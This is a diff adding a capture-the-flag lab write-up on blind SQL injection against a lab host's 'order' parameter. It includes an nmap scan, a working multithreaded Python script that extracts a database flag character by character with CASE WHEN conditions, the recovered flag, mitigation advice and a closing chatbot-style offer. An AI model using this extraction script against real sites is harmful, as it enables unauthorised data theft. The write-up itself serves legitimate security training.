@@ -1,0 +1,151 @@
+🛡️ SQL Injection Lab Writeup (Blind SQLi – Automated Extraction)
+📌 Target Information
+
+
+Target IP: 10.66.138.51
+
+
+Objective: Capture the flag using SQL Injection techniques
+
+
+
+🔍 Reconnaissance
+We begin with a basic port scan to identify open services.
+🔧 Nmap Scan
+nmap -sC -sV -oN scan.txt 10.66.138.51
+📊 Results
+PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH80/tcp open  http    Apache HTTP Server
+🧠 Analysis
+
+
+Port 22 (SSH) → Not useful without credentials
+
+
+Port 80 (HTTP) → Main attack surface
+
+
+
+🌐 Web Enumeration
+Accessing the web server in a browser:
+http://10.66.138.51
+The application appears to have a sorting functionality, likely using a parameter such as:
+http://10.66.138.51/?order=
+This parameter is a strong candidate for injection testing.
+
+💉 Identifying SQL Injection
+Testing basic payloads in the order parameter suggests backend SQL query manipulation.
+The behavior indicates a Blind SQL Injection, where:
+
+
+No direct output is shown
+
+
+But responses differ based on query conditions
+
+
+
+🧪 Exploitation Strategy
+We exploit the order parameter using a conditional SQL query:
+(CASE WHEN (condition) THEN title ELSE date END)
+🔑 Idea:
+
+
+If condition is TRUE → response matches normal page (title)
+
+
+If condition is FALSE → response differs (date)
+
+
+This allows us to extract data character by character.
+
+⚙️ Automation Script
+To efficiently extract the flag, we use a Python script with multithreading.
+import requests as reqimport stringimport concurrent.futuresurl  = 'http://10.66.138.51/?order='yes = req.get(url+"title").textdef check(counter,c):    query = f'(CASE WHEN (SELECT SUBSTRING(flag,1,{counter}) from flag)="{flag+c}" then title else date end)'    res = req.get(url+query).text    if(res==yes):        return cwith concurrent.futures.ThreadPoolExecutor() as executor:    flag=""    counter = 1    chars = string.ascii_letters + string.digits + "{" + "}"    while(1):        results = [executor.submit(check, counter, c) for c in chars]        for future in concurrent.futures.as_completed(results):            result = future.result()            if(result):                counter+=1                flag+=result                print("[+] Current Flag is",flag)                if(flag[-1:]=="}"):                    exit()
+
+⚡ How the Script Works
+
+
+Sends a baseline request:
+yes = req.get(url+"title").text
+
+
+Iterates through possible characters:
+
+
+a-z, A-Z, 0-9, {, }
+
+
+
+
+Uses SQL condition:
+SELECT SUBSTRING(flag,1,N)
+
+
+Compares response:
+
+
+If response matches baseline → correct character
+
+
+
+
+Builds the flag incrementally
+
+
+Stops when } is found
+
+
+
+🏁 Flag Extraction
+Script output:
+[+] Current Flag is flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
+🚩 Final Flag:
+flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
+
+🧠 Key Takeaways
+
+
+Blind SQL Injection relies on response differences, not direct output
+
+
+Conditional queries (CASE WHEN) are powerful for inference
+
+
+Automation is essential for efficiency
+
+
+Multithreading significantly speeds up extraction
+
+
+
+🔐 Mitigation (Defensive Perspective)
+To prevent such vulnerabilities:
+
+
+Use prepared statements / parameterized queries
+
+
+Avoid directly embedding user input into SQL queries
+
+
+Implement input validation and sanitization
+
+
+Use ORM frameworks where possible
+
+
+Apply least privilege on database users
+
+
+
+📚 Conclusion
+This lab demonstrates how even a simple parameter like order can be exploited using Blind SQL Injection. By leveraging conditional logic and automation, sensitive data such as flags can be extracted efficiently.
+
+If you want, next step I can help you:
+
+
+Turn this into a professional GitHub repo (README + screenshots + structure)
+
+
+Or make it Bugcrowd/HackerOne style report (more real-world ready)
+
